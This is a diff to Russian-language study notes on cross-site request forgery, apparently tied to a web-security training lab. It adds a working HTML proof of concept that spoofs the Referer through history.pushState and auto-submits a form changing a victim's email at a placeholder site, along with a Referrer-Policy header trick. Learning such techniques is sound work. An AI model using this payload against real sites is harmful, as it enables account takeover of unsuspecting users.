@@ -185,13 +185,27 @@ http://website.com/csrf-attack?vulnerable-website.com
 ```
 * Если строка запроса из заголовка Referer удаляется:
 ```
+Content-Type: text/html; charset=utf-8
 Referrer-Policy: unsafe-url 
 ```
 * Метод для обновления URL в адресной строке без обновления страницы:
 ```
+<html>
+<body>
 <script> 
-       history.pushState("", "", "/?0aa700ca04c849eb801621f5006500ea.web-security-academy.net")
+       history.pushState("", "", "/?victim-site.com/")
 </script>
+<form action="https://victim-site.com/change-email" method="POST">
+  <input required type="email" name="email" value="victim@net.com">
+<button class="button" type="submit">
+</form>
+
+<script>
+     document.forms[0].submit();
+</script>
+
+</body>
+</html>
 ```
 
 # **Последствия**
